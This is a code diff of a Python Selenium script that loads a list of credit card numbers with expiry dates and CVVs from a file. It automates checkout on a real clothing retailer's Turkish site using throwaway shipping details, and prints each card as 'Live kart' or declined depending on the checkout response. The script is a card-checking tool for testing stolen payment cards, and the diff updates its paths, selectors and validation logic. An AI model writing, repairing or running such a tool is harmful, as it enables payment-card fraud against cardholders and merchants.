@@ -23,7 +23,7 @@ from selenium.webdriver.support.wait import WebDriverWait
 
 
 def funct():
-    CCList = open(r'/home/kali/Masaüstü/Register User/cc.txt', "r", encoding="utf8").read().splitlines()
+    CCList = open(r'C:\Users\kahbe\Desktop\New folder\cc.txt', "r", encoding="utf8").read().splitlines()
     kartlar = []
 
     for i in CCList:
@@ -49,7 +49,7 @@ options.add_argument('--disable-gpu')
 options.add_argument('--ignore-certificate-errors')
 options.add_argument('--no-sandbox')
 #options.add_argument('--headless')
-driver = webdriver.Chrome(executable_path=r'/home/kali/Masaüstü/Register User/chromedriver', options=options)
+driver = webdriver.Chrome(executable_path=r'C:\Users\kahbe\Desktop\New folder\chromedriver.exe', options=options)
 driver.set_window_size(360,640)
 #driver = webdriver.Firefox(profile, options=options)
 wait = WebDriverWait(driver, 25, poll_frequency=1)
@@ -58,9 +58,9 @@ while True:
 
         print('Starting ..')
         driver.delete_all_cookies()
-        driver.get("https://www.bershka.com/tr/3%E2%80%99l%C3%BC-desenli-%C3%A7orap-paketi.-c0p102944194.html?colorId=800")
+        driver.get("https://www.bershka.com/tr/8-k%C4%B1l%C4%B1f%C4%B1-c0p103018449.html?colorId=512")
         sleep(2)
-        wait.until(EC.presence_of_element_located((By.ID, 'onetrust-accept-btn-handler'))).click()
+        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#onetrust-close-btn-container > button'))).click()
         wait.until(
         EC.presence_of_element_located((By.CSS_SELECTOR, '.button-text'))).click()
         #driver.find_element_by_css_selector('.button-text').click()
@@ -79,8 +79,8 @@ while True:
         wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div/input"))).send_keys("ahe3eds")
         driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").click()
         driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").send_keys("limkd3ert")
-        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[3]/div/input").click()
-        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[3]/div/input").send_keys("ka3532s39et@mail.com")
+        driver.find_element_by_name("email").click()
+        driver.find_element_by_name("email").send_keys("ka3532s39et@mail.com")
         driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").click()
         driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").send_keys("5344443565")
         driver.find_element_by_xpath("//*[@id='summary-wrapper']/div/div[2]/div/div/cta-checkout/div/div/div[2]/div").click()
@@ -154,14 +154,11 @@ while True:
             hata2 = ('Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.')
             hata1 = ('Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.')
             hata3 = ('Transaction not completed. Enter the expiry date on your card')
-            try:
-                yazi = driver.find_element(By.CSS_SELECTOR, ".message").text
-                if yazi == hata1 :
-                    print(Fore.GREEN +yazi," :", cc,"|",mm,"|",yy,"|",cvv,)
-                elif yazi == hata2 :
-                    print(Fore.GREEN +yazi," :",cc,"|",mm,"|",yy,"|",cvv,)
-                elif yazi == hata3 :
-                    print(Fore.GREEN + yazi," :",cc,"|",mm,"|",yy,"|",cvv,)
+            try: 
+                if driver.find_element(By.CSS_SELECTOR, ".message").text:
+                    print(Fore.RED +"DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,)
+                elif driver.find_element(By.CSS_SELECTOR, "#iPageContent > div.checkoutWrapper.checkout-confirmation > div.confirmation > div.confirmation-thank").text:
+                    print(Fore.GREEN +"Live kart "," :",cc,"|",mm,"|",yy,"|",cvv,)
                 else :
                     print(Fore.RED + '!!! -HATA OLDU AQ- !!! : ',cc,"|",mm,"|",yy,"|",cvv,)     
              #driver.find_element_by_xpath("//p[contains(.,'Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.')]" or "//p[contains(.,'Transaction not completed. Enter the expiry date on your card')]")
